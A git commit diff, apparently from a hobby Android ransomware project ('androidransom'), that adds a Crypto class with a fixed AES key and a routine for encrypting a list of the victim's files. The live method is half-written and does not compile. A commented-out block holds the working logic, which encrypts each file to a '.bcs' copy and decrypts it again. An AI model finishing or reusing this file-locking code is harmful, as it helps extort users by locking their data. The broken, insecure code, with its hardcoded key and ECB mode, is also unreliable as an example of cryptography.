811ad04f231322e73ec74a4fc4381f116658d324
bycracks <qudcjf153@gmail.com>
2017-06-27 07:27:11 +0900

    ddfdf
    dfdfd

---
+++ app/src/main/java/bycracks/androidransom/Crypto.java
@@ -0,0 +1,130 @@
+package bycracks.androidransom;
+
+import java.io.BufferedInputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.security.SecureRandom;
+import java.util.ArrayList;
+
+import javax.crypto.Cipher;
+import javax.crypto.KeyGenerator;
+import javax.crypto.SecretKey;
+import javax.crypto.spec.SecretKeySpec;
+
+/**
+ * Created by ByeongCheol on 2017-06-25.
+ */
+
+public class Crypto {
+
+    static SecretKeySpec skeySpec = null;
+
+    public Crypto() throws Exception {
+        if (skeySpec == null)
+            skeySpec = generateKey("password");
+    }
+
+
+    /**
+     * 암호화관련 함수
+     */
+    public SecretKeySpec generateKey(String pw) throws Exception {
+        byte[] keyStart = pw.getBytes("UTF-8");
+
+        KeyGenerator kgen = KeyGenerator.getInstance("AES");
+        SecureRandom sr = SecureRandom.getInstance("SHA1PRNG", "Crypto");
+        sr.setSeed(keyStart);
+        kgen.init(128, sr);
+        SecretKey skey = kgen.generateKey();
+
+        return new SecretKeySpec(skey.getEncoded(),"AES");
+    }
+
+    public void crypto(ArrayList<File> fileList, boolean decrypt) throws Exception {
+        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
+        int r;
+        byte[] buf = new byte[16];
+
+
+        if (decrypt) {
+            for (File inFile: fileList) {
+                BufferedInputStream bis = new BufferedInputStream(new FileInputStream(inFile), 16);
+                while((r = bis.read(buf, 0, 16)) != -1)
+
+
+                cipher.init(Cipher.DECRYPT_MODE, skeySpec);
+                byte[] data = cipher.doFinal(i);
+                inFile.
+
+
+
+            }
+
+        } else {
+            for (File inFile: fileList) {
+
+
+
+
+
+            }
+
+        }
+
+        for (File inFile: fileList) {
+
+
+
+
+
+
+        }
+
+
+        /*
+        for (File inFile : fileList) {
+            int idx1 = inFile.getPath().lastIndexOf("/");
+            int idx2 = inFile.getName().lastIndexOf(".");
+            FileInputStream fis = new FileInputStream(inFile);
+
+            byte[] buf = new byte[8];
+            int bytesRead;
+
+
+
+
+
+
+
+
+            if (decrypt) {
+                FileOutputStream fos = new FileOutputStream(inFile.getPath().substring(0,idx1+1)+inFile.getName().substring(0,idx2));
+
+                cipher.init(Cipher.DECRYPT_MODE, skeySpec);
+                CipherInputStream cis = new CipherInputStream(fis, cipher);     // decrypt
+
+                while ((bytesRead = cis.read(buf)) != -1)
+                    fos.write(buf, 0, bytesRead);
+                fos.flush();
+                fos.close();
+                cis.close();
+
+            } else {
+                FileOutputStream fos = new FileOutputStream(inFile+".bcs");
+
+                cipher.init(Cipher.ENCRYPT_MODE, skeySpec);
+                CipherOutputStream cos = new CipherOutputStream(fos, cipher);   // encrypt
+
+                while ((bytesRead = fis.read(buf)) != -1)
+                    cos.write(buf, 0, bytesRead);
+                cos.flush();
+                cos.close();
+                fos.close();
+
+            }
+            fis.close();
+        }
+        */
+    }
+
+}
--- app/src/main/java/bycracks/androidransom/MainActivity.java
+++ app/src/main/java/bycracks/androidransom/MainActivity.java
@@ -27,29 +27,6 @@ public class MainActivity extends AppCompatActivity {
                 != PackageManager.PERMISSION_GRANTED) {
             ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, MY_PERMISSIONS_REQUEST_READ_EXTERNAL_STORAGE);
 
-
-            /*
-            // Should we show an explanation?
-            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
-                    Manifest.permission.READ_EXTERNAL_STORAGE)) {
-
-                // Show an expanation to the user *asynchronously* -- don't block
-                // this thread waiting for the user's response! After the user
-                // sees the explanation, try again to request the permission.
-
-            } else {
-
-                // No explanation needed, we can request the permission.
-
-                ActivityCompat.requestPermissions(MainActivity.this,
-                        new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
-                        );
-
-                // MY_PERMISSIONS_REQUEST_READ_CONTACTS is an
-                // app-defined int constant. The callback method gets the
-                // result of the request.
-            }
-            */
         }
 
         ImageView click = (ImageView) findViewById(R.id.image1);
